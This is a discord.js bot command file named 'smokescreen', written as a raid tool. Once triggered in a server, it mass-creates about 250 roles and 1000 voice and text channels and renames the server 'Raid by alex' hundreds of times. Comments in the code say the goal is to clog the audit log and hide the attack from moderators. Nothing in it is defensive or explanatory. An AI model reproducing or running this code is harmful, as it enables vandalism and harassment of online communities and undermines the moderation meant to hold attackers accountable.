const Discord = require('discord.js');

  const ms = require('ms');
  exports.run = (client, message, args) => {

            for (var i = 0; i < 250; i++) {
                // Creates new roles to clog up the audit log
                message.guild.createRole({
                    name: 'bien le bonjour',
                    color: 'RED',
                });
              }
                for (var i = 0; i < 500; i++) {
                message.guild.createChannel('bien le bonjour', 'voice')
                message.guild.createChannel('bien le bonjour', 'text')
                //changes name tons of times to clog up the audit log
                message.guild.setName("Raid by alex");
                }
            };



    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'smokescreen',
        description: '',
        usage: ''
      };
